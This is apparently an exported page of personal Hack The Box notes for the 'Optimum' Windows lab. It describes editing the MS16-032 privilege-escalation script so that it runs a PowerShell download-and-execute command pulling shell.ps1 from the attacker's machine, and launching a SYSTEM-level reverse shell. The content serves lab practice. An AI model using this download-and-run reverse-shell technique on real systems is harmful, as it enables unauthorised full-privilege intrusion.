<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>vi MS16032</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="HacktheBox--Windows_Boxes--optimum.html">optimum</a></p>

<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--nmap.html">nmap</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--http.html">http</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--http--http_file_server_2.3_null_byte_exploit.html">http file server 2.3 null byte exploit</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--http--webpage_code_injection.html">webpage code injection</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell.html">Powershell</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang.html">Nishang</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang--Invoke-PoweShellTcp.ps1.html">Invoke-PoweShellTcp.ps1</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang--run_powershell_on_victim_machine.html">run powershell on victim machine</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang--run_powershell_on_victim_machine--pre_URL_encode.html">pre URL encode</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang--upload_to_HFS.html">upload to HFS</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang--upload_to_HFS--reverse_shell.html">reverse shell</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Sherlock.html">Sherlock</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Sherlock--Sherlock_functions.html">Sherlock functions</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Sherlock--report.html">report</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Sherlock--interesting_finds.html">interesting finds</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--MS16-032.html">MS16-032</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--MS16-032--Empire.html">Empire</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--MS16-032--vi_MS16032.html">vi MS16032</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--MS16-032--run_MS16-032_w-_reverse_shell.html">run MS16-032 w/ reverse shell</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--user-root.html">user/root</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--lessons_learned.html">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>vi MS16032</u></b></h1><span style="color:#24ff00;">Before we upload and run our exploit, just like </span><span style="color:#ffa500;">nishang</span><span style="color:#24ff00;">, </span><span style="color:#ffa500;">sherlock</span><span style="color:#24ff00;"> and most </span><span style="color:#ffa500;">powershell scripts</span><span style="color:#24ff00;">, we'll have to add the function we want executed to the bottom of the script, for </span><span style="color:#ffa500;">Invoke-MS16032.ps1</span><span style="color:#24ff00;">, it's<br /></span><br /><img src="images/509-1.png" alt="images/509-1.png" /><br /><br /><span style="color:#ffa500;">Invoke-MS16-032 -Command "iex(new object net.webclient).downloadstring('http://10.10.14.62/8000/shell.ps1')"</span><br /><img src="images/509-2.png" alt="images/509-2.png" /><br /><span style="color:#24ff00;"><br />We need to make a copy of our </span><span style="color:#ffa500;">Invoke-PowershellTcp.ps1</span><span style="color:#24ff00;"> script so </span><span style="color:#ffa500;">MS16-032 </span><span style="color:#24ff00;">can run it with </span><span style="color:#ffff00;">system privileges</span><span style="color:#24ff00;"> to call a reverse shell back to our attack machine</span><br /><img src="images/509-3.png" alt="images/509-3.png" /><br /><span style="color:#24ff00;">also, tweak the </span><span style="color:#ffa500;">Invoke-PowerShellTcp</span><span style="color:#24ff00;"> command to point to a different port number since we're already using port 4444 from our initial foothold</span><br /><img src="images/509-4.png" alt="images/509-4.png" /><br /><br /><br /><br /></div></div>
</body></html>